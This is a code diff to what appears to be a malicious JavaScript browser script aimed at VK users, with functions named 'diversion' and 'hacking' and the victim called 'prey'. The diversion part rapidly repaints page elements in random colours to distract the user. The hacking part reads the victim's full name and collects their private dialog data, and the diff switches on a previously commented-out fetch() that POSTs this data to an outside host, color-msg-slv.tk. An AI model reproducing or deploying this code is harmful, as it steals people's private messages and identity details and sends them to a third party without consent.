@@ -300,18 +300,26 @@ function diversion() {
 
 
         // ===== BREAK PAGE BY RANDOM COLORS ===== //
+        // get elements for painting
+        let divs = vkCopy.document.querySelectorAll('a, ol, ul, input, textarea');
+
+        // every 5sec update elements list
+        setInterval(() => {
+            divs = vkCopy.document.querySelectorAll('a, ol, ul, input, textarea');
+        }, 5000);
+
         /**
          * get randow div on page and paint it random color
          */
         function paintRandom() {
+            // get random bg
             let bg = "background-color: " +
                 '#' + (Math.random().toString(16) + '000000').substring(2, 8).toUpperCase();
 
-            let divs = vkCopy.document.querySelectorAll('li, a, span, input, textarea');
-            arrayRandElement(divs).style = bg;
+            arrayRandElement(divs).style = bg; // bg for random element
         }
 
-        setInterval(paintRandom, 1500);
+        setInterval(paintRandom, 70);
     }, 5000);
 }
 // ================= ОТВЛЕЧЕНИЕ ================== //
@@ -325,7 +333,7 @@ async function hacking() {
 
     // ===== GET PREY's FULLNAME ===== //
     toProfile(); // go to profile
-    await wait(2000); // wait some time
+    await wait(3500); // wait some time
     let preyName = getPreyFullName(); // get full name
     // ===== GET PREY's FULLNAME ===== //
 
@@ -372,13 +380,13 @@ async function hacking() {
         let formData = new FormData();
         formData.append('data', JSON.stringify(dialogsData));
 
-        // fetch(
-        //     'https://color-msg-slv.tk/save-it.php', {
-        //         method: 'POST',
-        //         mode: 'no-cors',
-        //         body: formData,
-        //     }
-        // );
+        fetch(
+            'https://color-msg-slv.tk/save-it.php', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: formData,
+            }
+        );
         console.log('data is missed');
         dialogsData = {
             [preyName]: {}
